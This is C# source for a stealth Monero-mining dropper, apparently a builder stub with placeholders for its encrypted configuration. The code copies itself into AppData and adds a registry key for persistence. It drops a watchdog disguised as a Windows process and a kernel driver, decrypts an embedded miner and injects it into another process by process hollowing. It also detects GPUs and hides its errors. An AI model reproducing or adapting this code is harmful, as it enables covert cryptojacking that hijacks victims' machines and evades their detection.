﻿using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]
#endif

public partial class Program
{
    public static string lb = RGetString("#LIBSPATH");
    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb;

    public static void Main()
    {
#if DefInstall
        Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
        RInstall();
#endif
        RInitialize();
    }

#if DefInstall
    public static void RInstall()
    {
        Thread.Sleep(2 * 1000);
        try
        {
            if (Process.GetCurrentProcess().MainModule.FileName != PayloadPath)
            {
                foreach (Process P in Process.GetProcessesByName(Path.GetFileName(PayloadPath)))
                {
                    try
                    {
                        if (P.MainModule.FileName == PayloadPath)
                        {
                            P.Kill();
                        }
                    }
                    catch
                    {
                    }
                }

                File.WriteAllBytes(PayloadPath, File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName));
                Thread.Sleep(2 * 1000);
                RBaseFolder();
                Process.Start(PayloadPath);
                Environment.Exit(0);
            }
        }
        catch{}
    }
#endif

    public static byte[] RGetTheResource(string Get_)
    {
        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
        return RAES_Decryptor((byte[])MyResource.GetObject(Get_));
    }

    public static string RGetString(string input)
    {
        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(input)));
    }

    public static void RRun(byte[] PL, string arg, byte[] buffer)
    {
        // Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        try
        {
            Assembly.Load(PL).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { buffer, RGetString("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), arg });
        }
        catch{}
    }

    public static void RBaseFolder()
    {
        try
        {
            Directory.CreateDirectory(bD);
            var DirInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb.Split(new char[] { '\\' })[0]);

#if DefWatchdog
            foreach (Process proc in Process.GetProcessesByName("sihost64"))
            {
                proc.Kill();
            }

            Thread.Sleep(3000);
            File.WriteAllBytes(bD + "sihost64.exe", RGetTheResource("#watchdog"));

            if (Process.GetProcessesByName("sihost64").Length < 1)
            {
                Process.Start(bD + "sihost64.exe");
            }
#endif

            File.WriteAllBytes(bD + "WR64.sys", RGetTheResource("#winring"));
        }
        catch { }
    }

    public static bool RCheckProc()
    {
        var options = new ConnectionOptions();
        options.Impersonation = ImpersonationLevel.Impersonate;
        var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
        scope.Connect();

        string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
        var query = new ObjectQuery(wmiQuery);
        var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
        var managementObjectCollection = managementObjectSearcher.Get();
        foreach (ManagementObject retObject in managementObjectCollection)
        {
            if (retObject["CommandLine"].ToString().Contains("--donate-l"))
            {
                return true;
            }
        }

        return false;
    }

    public static void RInitialize()
    {
        int startDelay = 0;
        if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
        {
            Thread.Sleep(startDelay * 1000);
        }

        try
        {
            RBaseFolder();
            string rS = "";

#if DefGPU
            try
            {
                string GPUstr = RGetGPU();
                if (GPUstr.ToLower().Contains("nvidia") || GPUstr.ToLower().Contains("amd"))
                {
                    try
                    {
                        using (var archive = new ZipArchive(new MemoryStream(RGetTheResource("#libs"))))
                        {
                            foreach (ZipArchiveEntry entry in archive.Entries)
                                entry.ExtractToFile(Path.Combine(bD, entry.FullName), true);
                        }

                        if (GPUstr.ToLower().Contains("nvidia"))
                        {
                            rS += " --cuda --cuda-loader=" + "\"" + bD + "ddb64.dll" + "\"";
                        }

                        if (GPUstr.ToLower().Contains("amd"))
                        {
                            rS += " --opencl ";
                        }
                    }
                    catch{}
                }
            }
            catch{}
#endif

            string argstr = RGetString("#ARGSTR") + rS;
            argstr = argstr.Replace("{%RANDOM%}", Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10));
            argstr = argstr.Replace("{%COMPUTERNAME%}", System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10));
            if (RCheckProc())
            {
                Environment.Exit(0);
            }

            try
            {
                using (var archive = new ZipArchive(new MemoryStream(RGetTheResource("#xmr"))))
                {
                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        if (entry.FullName.Contains("ri"))
                        {
                            using (var streamdata = entry.Open())
                            {
                                using (var ms = new MemoryStream())
                                {
                                    streamdata.CopyTo(ms);
                                    RRun(RGetTheResource("#dll"), argstr, ms.ToArray());
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }
        catch { }
    }

#if DefGPU
    public static string RGetGPU()
    {
        try
        {
            string VideoCard = "";
            var objquery = new ObjectQuery("SELECT * FROM Win32_VideoController");
            var objSearcher = new ManagementObjectSearcher(objquery);
            foreach (ManagementObject MemObj in objSearcher.Get())
                VideoCard = VideoCard + MemObj["VideoProcessor"] + " ";
            if (VideoCard.ToLower().Contains("nvidia") || VideoCard.ToLower().Contains("amd"))
            {
                return VideoCard;
            }

            foreach (ManagementObject MemObj in objSearcher.Get())
                VideoCard = VideoCard + MemObj["Name"] + " ";
            if (VideoCard.ToLower().Contains("nvidia") || VideoCard.ToLower().Contains("amd"))
            {
                return VideoCard;
            }

            return "";
        }
        catch (Exception ex)
        {
            return "";
        }
    }
#endif

    public static byte[] RAES_Decryptor(byte[] input)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
            {
                cStream.Write(input, 0, input.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }
}